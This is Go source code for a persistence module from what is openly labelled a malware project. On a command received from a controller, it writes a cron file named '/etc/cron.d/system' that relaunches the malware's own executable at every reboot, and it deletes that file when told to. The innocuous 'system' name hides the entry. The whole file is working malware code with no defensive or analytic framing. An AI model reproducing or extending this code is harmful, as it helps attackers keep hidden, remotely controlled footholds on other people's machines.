package cron_persistence

import (
	"fmt"
	"io/ioutil"
	"malware/common/messages"
	"malware/common/types"
	"os"
)

/**
Inserts an entry into the crontab to automatically launch the malware
*/

type settings struct {
}

// Create creates an implementation of settings
func Create() types.Module {
	return settings{}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
	status := message.GetPersistence()
	if status == nil {
		return false
	}

	if !status.Enable {
		err := os.Remove("/etc/cron.d/system")
		if err != nil {
			fmt.Println(err)
			return true
		}
	} else {
		ex, err := os.Executable()
		if err != nil {
			fmt.Println(err)
			return true
		}

		err = ioutil.WriteFile("/etc/cron.d/system", []byte(fmt.Sprintf("@reboot %s\n", ex)), 0640)
		if err != nil {
			fmt.Println(err)
			return true
		}
	}

	return true
}

func (settings settings) Shutdown() {
}

func (settings) ID() string { return "cron_persistence" }
